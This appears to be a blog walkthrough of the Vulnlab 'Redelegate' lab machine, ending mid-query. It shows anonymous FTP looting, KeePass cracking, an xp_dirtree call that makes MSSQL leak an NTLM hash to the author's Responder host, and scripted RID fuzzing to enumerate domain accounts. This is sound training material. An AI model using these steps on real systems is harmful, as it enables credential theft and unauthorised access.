<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Redelegate - Vulnlab | serioton</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="active directory, mssql, ACLs, delegation">
<meta property="og:type" content="article">
<meta property="og:title" content="Redelegate - Vulnlab">
<meta property="og:url" content="https://seriotonctf.github.io/2024/11/24/Redelegate-Vulnlab/index.html">
<meta property="og:site_name" content="serioton">
<meta property="og:description" content="active directory, mssql, ACLs, delegation">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://assets.vulnlab.com/redelegate_slide.png">
<meta property="article:published_time" content="2024-11-24T16:47:11.000Z">
<meta property="article:modified_time" content="2024-11-24T22:48:37.406Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="vulnlab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://assets.vulnlab.com/redelegate_slide.png"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2024/11/24/Redelegate-Vulnlab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Redelegate - Vulnlab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-24 22:48:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/train_travel.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Redelegate - Vulnlab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2024-11-24T16:47:11.000Z" title="Created 2024-11-24 16:47:11">2024-11-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Redelegate - Vulnlab"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Redelegate is a hard Active Directory machine from Vulnlab, created by Geiseric. It involves enumerating domain accounts via MSSQL, abusing GenericAll on a machine account, and performing constrained delegation.</p>
<h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo nmap -n -Pn --min-rate=1000 -T4 10.10.123.27 -p- -v | tee ports</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">5357/tcp  open  wsdapi</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br></pre></td></tr></table></figure>
<p>From the Nmap scan, we can see that we are dealing with a Domain Controller, as it has DNS, LDAP, and Kerberos services running. Additionally, there is FTP on port 21 an MSSQL service running on port 1433, which is particularly noteworthy</p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>We can connect to FTP anonymously and list files</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  ftp 10.10.123.27</span><br><span class="line">Connected to 10.10.123.27.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.10.123.27:serioton): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password:</span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||53160|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">10-20-24  12:11AM                  434 CyberAudit.txt</span><br><span class="line">10-20-24  04:14AM                 2622 Shared.kdbx</span><br><span class="line">10-20-24  12:26AM                  580 TrainingAgenda.txt</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>
<p>Let’s switch to binary mode, disable the prompt, and download all the files</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; binary</span><br><span class="line">200 Type set to I.</span><br><span class="line">ftp&gt; prompt off</span><br><span class="line">Interactive mode off.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">...</span><br><span class="line">ftp&gt; exit</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>
<p>In the files, they mentioned weak passwords like the “SeasonYear!” format and outlined ongoing issues with unused Active Directory objects and dangerous ACLs.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Friday 18th October | 11.30 - 13.30 - 7 attendees</span><br><span class="line">&quot;Weak Passwords&quot; - Why &quot;SeasonYear!&quot; is not a good password</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>We can use this format to create a wordlist to use for password spraying</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Spring2024!</span><br><span class="line">Summer2024!</span><br><span class="line">Autumn2024!</span><br><span class="line">Winter2024!</span><br><span class="line">Fall2024!</span><br></pre></td></tr></table></figure>
<p>Currently, We don’t have any valid users to test these passwords with, but remember that one of the files we retrieved from FTP is a Keepass database</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  file Shared.kdbx</span><br><span class="line">Shared.kdbx: Keepass password database 2.x KDBX</span><br></pre></td></tr></table></figure>
<p>We can attempt to crack this file with john by providing the wordlist we created</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  keepass2john Shared.kdbx | tee hash</span><br><span class="line">Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca</span><br><span class="line">➜  john hash --wordlist=passwords.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (KeePass [SHA256 AES 32/64])</span><br><span class="line">Cost 1 (iteration count) is 600000 for all loaded hashes</span><br><span class="line">Cost 2 (version) is 2 for all loaded hashes</span><br><span class="line">Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">&lt;REDACTED&gt;        (Shared)</span><br><span class="line">1g 0:00:00:00 DONE (2024-11-24 12:11) 3.030g/s 15.15p/s 15.15c/s 15.15C/s Spring2024!..Fall2024!</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure>
<p>Now, we can use export the content of the database using <code>keepassxc-cli</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  keepassxc-cli export  Shared.kdbx --format csv | awk -F&#x27;,&#x27; &#x27;&#123;print $3 &quot;:&quot; $4&#125;&#x27; | sed &#x27;s/&quot;//g&#x27;</span><br><span class="line">Enter password to unlock Shared.kdbx:</span><br><span class="line"></span><br><span class="line">Username:Password</span><br><span class="line">FTPUser:&lt;REDACTED&gt;</span><br><span class="line">Administrator:&lt;REDACTED&gt;</span><br><span class="line">WordPress Panel:&lt;REDACTED&gt;</span><br><span class="line">SQLGuest:&lt;REDACTED&gt;</span><br><span class="line">:&lt;REDACTED&gt;</span><br><span class="line">Timesheet:&lt;REDACTED&gt;</span><br><span class="line">Payroll:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
<p>Great, now we have a list of usernames and passwords. One username in particular stands out: the <code>sqlguest</code> account. We can try it with MSSQL</p>
<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  mssqlclient.py sqlguest@redelegate.vl</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (SQLGuest  guest@master)&gt;</span><br></pre></td></tr></table></figure>
<p>We managed to log in, but it’s just a guest account. The first thing I always do is run <code>xp_dirtree</code> to capture the hash of the account running the SQL service.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL (SQLGuest  guest@master)&gt; xp_dirtree \\10.8.0.210\share</span><br><span class="line">subdirectory   depth   file</span><br><span class="line">------------   -----   ----</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo responder -I tun0</span><br><span class="line">...</span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.123.27</span><br><span class="line">[SMB] NTLMv2-SSP Username : REDELEGATE\sql_svc</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : sql_svc::REDELEGATE:19683510782d6f86:5FE2CF7A00075E735FD2E0FF55E8BCE4:0101000000000000001930F36B3EDB01967E7092CC5EC5A90000000002000800410054005600550001001E00570049004E002D0031003900350057004200460031004F0038005900540004003400570049004E002D0031003900350057004200460031004F003800590054002E0041005400560055002E004C004F00430041004C000300140041005400560055002E004C004F00430041004C000500140041005400560055002E004C004F00430041004C0007000800001930F36B3EDB0106000400020000000800300030000000000000000000000000300000F9B0B238EE5347C05DF2985475D8A4ED15F0F41E2D9DA4CEC500DF5EABE1C15E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0030002E003200310030000000000000000000</span><br></pre></td></tr></table></figure>
<p>We obtained the hash of the <code>sql_svc</code> account, but it could not be cracked.<br>At this point, it seemed like a dead end. However, after some research, we found <a target="_blank" rel="noopener" href="https://www.netspi.com/blog/technical-blog/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/">this blogpost</a> from 2015, which describes a method to enumerate domain users using MSSQL.</p>
<h3 id="Enumerating-Domain-Accounts"><a href="#Enumerating-Domain-Accounts" class="headerlink" title="Enumerating Domain Accounts"></a>Enumerating Domain Accounts</h3><p>The steps to achieve this are outlined in the blog post. The first step is to retrieve the domain name.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL (SQLGuest  guest@master)&gt; SELECT DEFAULT_DOMAIN() as mydomain;</span><br><span class="line">mydomain</span><br><span class="line">----------</span><br><span class="line">REDELEGATE</span><br></pre></td></tr></table></figure>
<p>Next, we use a default group, in this case, <code>Domain Admins</code>, to retrieve the RID</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL (SQLGuest  guest@master)&gt; SELECT SUSER_SID(&#x27;REDELEGATE\Domain Admins&#x27;)</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">b&#x27;010500000000000515000000a185deefb22433798d8e847a00020000&#x27;</span><br></pre></td></tr></table></figure>
<p>Once the full RID has been obtained, we can extract the domain SID by taking the first 48 bytes. In our case, it’s <code>0x010500000000000515000000A185DEEFB22433798D8E847AF4010000</code>. We can use the following python code to convert the SID to a readable format</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_sid_to_string_sid</span>(<span class="params">hex_sid</span>):</span><br><span class="line">    sid_bytes = <span class="built_in">bytes</span>.fromhex(hex_sid[<span class="number">2</span>:])</span><br><span class="line">    revision = sid_bytes[<span class="number">0</span>]</span><br><span class="line">    sub_auth_count = sid_bytes[<span class="number">1</span>]</span><br><span class="line">    identifier_authority = <span class="built_in">int</span>.from_bytes(sid_bytes[<span class="number">2</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    sub_authorities = [</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(sid_bytes[<span class="number">8</span> + (i * <span class="number">4</span>):<span class="number">12</span> + (i * <span class="number">4</span>)], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sub_auth_count)</span><br><span class="line">    ]</span><br><span class="line">    string_sid = <span class="string">f&quot;S-<span class="subst">&#123;revision&#125;</span>-<span class="subst">&#123;identifier_authority&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> sub_auth <span class="keyword">in</span> sub_authorities:</span><br><span class="line">        string_sid += <span class="string">f&quot;-<span class="subst">&#123;sub_auth&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> string_sid</span><br><span class="line"></span><br><span class="line">hex_sid = <span class="string">&quot;0x010500000000000515000000a185deefb22433798d8e847a00020000&quot;</span></span><br><span class="line">sid = hex_sid_to_string_sid(hex_sid)</span><br><span class="line"><span class="built_in">print</span>(sid)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-5-21-4024337825-2033394866-2055507597-512</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Refer to steps 6 through 12 in the <code>Manual Process for Enumerating Domain Accounts</code> section of the blog post.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL (SQLGuest  guest@master)&gt; SELECT SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF4010000)</span><br><span class="line"></span><br><span class="line">-----------------------------</span><br><span class="line">WIN-Q13O908QBPG\Administrator</span><br></pre></td></tr></table></figure>
<p>After obtaining the SID, we can start generating our own RIDs and begin fuzzing</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_rid_queries</span>(<span class="params">base_sid, start_rid, count, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> <span class="built_in">range</span>(start_rid, start_rid + count):</span><br><span class="line">            hex_rid = <span class="string">f&quot;<span class="subst">&#123;rid:08X&#125;</span>&quot;</span> </span><br><span class="line">            reversed_rid = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">                [hex_rid[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_rid), <span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">            )</span><br><span class="line">            full_sid = <span class="string">f&quot;<span class="subst">&#123;base_sid&#125;</span><span class="subst">&#123;reversed_rid&#125;</span>&quot;</span></span><br><span class="line">            query = <span class="string">f&quot;SELECT SUSER_SNAME(<span class="subst">&#123;full_sid&#125;</span>)&quot;</span></span><br><span class="line">            file.write(query + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_rid_queries(<span class="string">&quot;0x010500000000000515000000A185DEEFB22433798D8E847A&quot;</span>, <span class="number">500</span>, <span class="number">1000</span>, <span class="string">&quot;queries.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>This script will generate a file like this</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF4010000)</span><br><span class="line">SELECT SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF5010000)</span><br><span class="line">SELECT SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF6010000)</span><br><span class="line">SELECT SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF7010000)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Each line represents a query for a specific RID appended to the base SID. We can pass this file to <code>mssqlclient.py</code> using the <code>-file</code> option and let it enumerate and print all the domain users</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  mssqlclient.py sqlguest:&lt;REDACTED&gt;@redelegate.vl -file queries.txt | tee result.txt</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)</span><br><span class="line">SQL&gt; SELECT SUSER_SNAME(0x010500000000000515000000A185DEEFB22433798D8E847AF4010000)</span><br><span class="line"></span><br><span class="line">-----------------------------</span><br><span class="line">WIN-Q13O908QBPG\Administrator</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT 